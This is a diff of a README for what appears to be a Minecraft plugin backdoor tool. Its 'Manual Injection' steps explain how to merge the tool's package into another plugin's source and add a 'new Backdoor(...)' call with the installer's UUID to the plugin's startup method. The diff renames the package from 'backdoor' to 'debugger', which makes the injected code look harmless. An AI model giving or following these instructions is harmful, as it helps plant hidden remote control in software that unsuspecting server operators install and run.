@@ -34,11 +34,11 @@ This is pretty much a finished project in my mind, but if you can code together 
 ### Manual Injection:
 
 * Download source code for desired plugin, and open in editor of your choice.
-* Merge ``com.thiccindustries.backdoor`` folder into the plugin's source.
+* Merge ``com.thiccindustries.debugger`` folder into the plugin's source.
 * Open the Plugin's main source file, The file's class definition should look like this: 
 ``public class Something extends JavaPlugin{}``
 * Add the following line to the top of the file:
-``import com.thiccindustries.backdoor``
+``import com.thiccindustries.debugger``
 * Find the ``@Override public void onEnable(){}`` method.
 * Add the following line to the beginning of the method:
 ``new Backdoor(this, new String[]{"[Your UUID Here]"}, [Your Chat Prefix Here]);``
